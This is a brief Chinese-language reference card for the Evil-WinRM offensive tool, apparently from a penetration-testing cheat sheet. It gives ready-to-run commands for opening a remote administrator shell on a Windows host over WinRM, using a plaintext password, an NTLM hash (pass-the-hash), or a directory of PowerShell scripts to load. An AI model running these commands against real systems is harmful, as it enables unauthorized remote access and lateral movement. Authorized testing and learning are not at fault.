### Evil-WinRM

| 属性 | 值 |
|------|-----|
| 版本 | 3.4 |
| 平台 | Linux |
| 风险 | 🔴 高 |
| 标签 | `WinRM` `PTH` `交互式Shell` |

## WinRM 远程管理与利用

### 使用明文密码连接
```bash
bash evil_winrm.sh -i 192.168.1.10 -u administrator -p Admin@123
```

### 使用 NTLM Hash 连接 (PTH)
```bash
bash evil_winrm.sh -i 192.168.1.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

### 加载本地 PowerShell 脚本
```bash
bash evil_winrm.sh -i 192.168.1.10 -u administrator -p Admin@123 -s /opt/scripts/
```

- ✓ 基于 HTTP/HTTPS 协议
- ✓ 原生支持 Pass-the-Hash
- ✓ 提供完善的 PowerShell 交互环境
